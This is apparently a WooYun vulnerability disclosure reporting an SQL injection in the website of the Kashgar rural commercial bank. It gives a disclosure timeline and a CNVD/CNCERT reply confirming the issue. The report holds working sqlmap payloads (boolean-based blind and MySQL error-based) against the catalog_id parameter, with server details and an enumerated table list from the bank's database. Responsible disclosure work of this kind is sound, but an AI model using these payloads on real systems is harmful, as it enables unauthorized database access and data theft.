wybug_title: 喀什农商银行存在SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2016-01-13：	细节已通知厂商并且等待厂商处理中									2016-01-15：	厂商已经确认，细节仅向厂商公开									2016-01-25：	细节向核心白帽子及相关领域专家公开									2016-02-04：	细节向普通白帽子公开									2016-02-14：	细节向实习白帽子公开									2016-02-27：	细节向公众公开  简要描述： RT 详细说明：  
注入点http://**.**.**.**/?r=about%2Findex&catalog_id=126http://**.**.**.**/index.php?r=about%2Findex&catalog_id=126

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: catalog_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: r=about/index&catalog_id=126) AND 3452=3452 AND (8525=8525    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: r=about/index&catalog_id=126) AND (SELECT 9186 FROM(SELECT COUNT(*),CONCAT(0x7170786271,(SELECT (ELT(9186=9186,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (5050=5050---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.3.27back-end DBMS: MySQL 5.0available databases [2]:[*] information_schema[*] xjkrcbDatabase: xjkrcb+-------------------------+---------+| Table                   | Entries |+-------------------------+---------+| yiif_session            | 282     || yiif_upload             | 186     || yiif_tag_data           | 179     || yiif_about              | 66      || yiif_catalog            | 52      || yiif_setting            | 47      || yiif_menu               | 41      || yiif_tag                | 38      || yiif_business           | 32      || yiif_soft               | 28      || yiif_product            | 21      || yiif_ebank              | 19      || yiif_comment            | 11      || yiif_model_type         | 11      || yiif_image              | 10      || yiif_user_group         | 10      || yiif_reply              | 7       || yiif_ad_position        | 6       || yiif_link               | 6       || yiif_page               | 6       || yiif_question           | 6       || yiif_video              | 6       || yiif_ad                 | 5       || yiif_defenrence         | 5       || yiif_recommend_position | 5       || yiif_user               | 5       || yiif_oauth              | 4       || yiif_service            | 3       || yiif_apply              | 2       || yiif_news               | 2       || yiif_recommend          | 2       || yiif_attention          | 1       || yiif_collect            | 1       || yiif_goods              | 1       || yiif_mail_log           | 1       |+-------------------------+---------+
   漏洞证明：  RT   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-01-15 16:10 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向银行业信息化主管部门通报，并抄报新疆分中心协助处置，由其后续协调网站管理单位处置。 最新状态： 暂无
